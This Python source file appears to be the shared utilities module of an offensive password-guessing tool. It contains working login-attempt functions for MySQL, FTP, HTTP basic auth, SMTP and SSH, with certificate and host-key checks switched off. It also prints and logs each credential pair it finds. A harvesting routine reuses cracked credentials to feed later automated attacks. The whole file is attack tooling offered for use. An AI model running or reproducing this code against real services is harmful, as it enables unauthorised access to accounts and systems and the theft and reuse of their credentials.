"""
Shared utilities for all attacks:
 - save_result, harvest_creds_from_log
 - per-service attempt() dispatch
 - apply_delay
 - download_bytes convenience wrapper
"""
import base64
import ftplib
import http.client
import smtplib
import ssl
import time
from datetime import datetime

import pymysql
import pymysql.err

from Design.colors_cli import console
from modules.downloads import save_bytes as _save_bytes


def save_result(host, port, user, password, log_file, service="mysql"):
    console.print(
        f"\n[bold success]✓ CREDENTIALS FOUND ({service.upper()})[/bold success]\n"
        f"  [muted]Host     :[/muted] [success]{host}:{port}[/success]\n"
        f"  [muted]Service  :[/muted] [primary]{service.upper()}[/primary]\n"
        f"  [muted]Username :[/muted] [success]{user}[/success]\n"
        f"  [muted]Password :[/muted] [success]{password}[/success]"
    )
    if log_file:
        try:
            with open(log_file, "a", encoding="utf-8") as fh:
                ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                fh.write(
                    f"[{ts}] {service} {host}:{port} "
                    f"user={user!r} pass={password!r}\n"
                )
        except OSError as exc:
            console.print(f"  [warning]Could not write log: {exc}[/warning]")


def harvest_creds_from_log(log_file: str | None) -> list[tuple[str, str]]:
    """
    Parse a log file for `user='X' pass='Y'` lines and return unique cred pairs.
    Used by FULL_AUTO to feed later attacks.
    """
    if not log_file:
        return []
    import re
    pairs: list[tuple[str, str]] = []
    try:
        with open(log_file, "r", encoding="utf-8", errors="replace") as fh:
            for line in fh:
                m = re.search(r"user='?([^'\s]+)'?\s+pass='?([^'\s]*)'?", line)
                if m:
                    pair = (m.group(1), m.group(2))
                    if pair not in pairs:
                        pairs.append(pair)
    except OSError:
        return []
    return pairs


# --------- per-service attempt dispatch ---------

def _mysql_attempt(host, port, u, p):
    try:
        c = pymysql.connect(host=host, port=port, user=u, password=p,
                            connect_timeout=5)
        c.close()
        return True
    except pymysql.err.OperationalError:
        return False
    except Exception:
        return False


def _ftp_attempt(host, port, u, p):
    ftp = ftplib.FTP()
    try:
        ftp.connect(host, port, timeout=5)
        ftp.login(u, p)
        try:
            ftp.quit()
        except Exception:
            ftp.close()
        return True
    except ftplib.error_perm:
        return False
    except Exception:
        return False
    finally:
        try:
            ftp.close()
        except Exception:
            pass


def _http_attempt(host, port, u, p):
    for tls in (False, True):
        try:
            if tls:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                c = http.client.HTTPSConnection(
                    host, port, timeout=5, context=ctx)
            else:
                c = http.client.HTTPConnection(host, port, timeout=5)
            token = base64.b64encode(f"{u}:{p}".encode()).decode()
            c.request("GET", "/", headers={"Authorization": f"Basic {token}"})
            r = c.getresponse()
            r.read()
            c.close()
            if r.status == 200:
                return True
        except Exception:
            pass
    return False


def _https_attempt(host, port, u, p):
    return _http_attempt(host, port, u, p)


def _smtp_attempt(host, port, u, p):
    try:
        if port == 465:
            s = smtplib.SMTP_SSL(host, port, timeout=5)
        else:
            s = smtplib.SMTP(host, port, timeout=5)
            try:
                s.starttls()
            except Exception:
                pass
        s.login(u, p)
        try:
            s.quit()
        except Exception:
            pass
        return True
    except smtplib.SMTPAuthenticationError:
        return False
    except Exception:
        return False


def _ssh_attempt(host, port, u, p):
    try:
        import paramiko
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(
            hostname=host, port=port, username=u, password=p,
            timeout=5, allow_agent=False, look_for_keys=False,
            banner_timeout=8, auth_timeout=8,
        )
        c.close()
        return True
    except Exception:
        return False


_DISPATCH = {
    "mysql": _mysql_attempt,
    "ftp":   _ftp_attempt,
    "http":  _http_attempt,
    "https": _https_attempt,
    "smtp":  _smtp_attempt,
    "ssh":   _ssh_attempt,
}


def attempt(host, port, user, password, service="mysql"):
    fn = _DISPATCH.get(service.lower())
    return fn(host, port, user, password) if fn else False


def apply_delay(delay):
    if delay > 0:
        time.sleep(delay)


def download_bytes(content: bytes, name: str, host: str, subdir: str = "") -> str:
    """Convenience wrapper around modules.downloads.save_bytes."""
    return _save_bytes(content, name, host=host, subdir=subdir)